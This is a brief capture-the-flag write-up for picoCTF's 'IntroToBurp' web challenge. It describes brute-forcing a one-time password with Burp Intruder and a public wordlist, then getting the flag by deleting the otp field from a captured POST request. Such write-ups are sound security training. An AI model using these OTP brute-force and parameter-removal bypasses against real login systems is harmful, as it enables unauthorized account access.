# Challange Info

Name : IntroToBurp

Difficulty : Easy

Category : Web Exploitation

Link : https://play.picoctf.org/practice/challenge/419?category=1&page=1

# Writeup

Navigating the web app http://titan.picoctf.net:62531/.

There is a basic registration form.

Filling up registration form and it asks us for OTP.

Sending the OTP request to Intruder and Repeater.

Using intruders sniper attack for bruteforcing the OTP.

OTP wordlist link : https://github.com/indahud/OTP-Wordlist

While this was happening I also checked the request in repeater and tried removing OTP from data section fully.

```
POST /dashboard HTTP/1.1

Host: titan.picoctf.net:62531

Content-Length: 7

Cache-Control: max-age=0

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36

Origin: http://titan.picoctf.net:62531

Content-Type: application/x-www-form-urlencoded

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://titan.picoctf.net:62531/dashboard

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Cookie: session=.eJwtjssOwiAQRf-FtYtiqQV_pinziMYWGgZijPHfHaLLezL3zH0buNeXuRpGYUFzMiCFl5oflJQGawFHHiJcwE08WkuRwAPPgwsW7RBnAoKz9rht25LWnbSGquIuy_XQ6IN3ftJ4rCLPXLD_04tObjnRktoeqSgV_I1oQuXvkr7MfL6UjDWv.Z2rbng.X8pceP8PfoaAsdrSYPlMXZilyPc

sec-gpc: 1

Connection: keep-alive



otp=123456
```

Removing `otp=123456`

And this reveals the flag in response of this request.
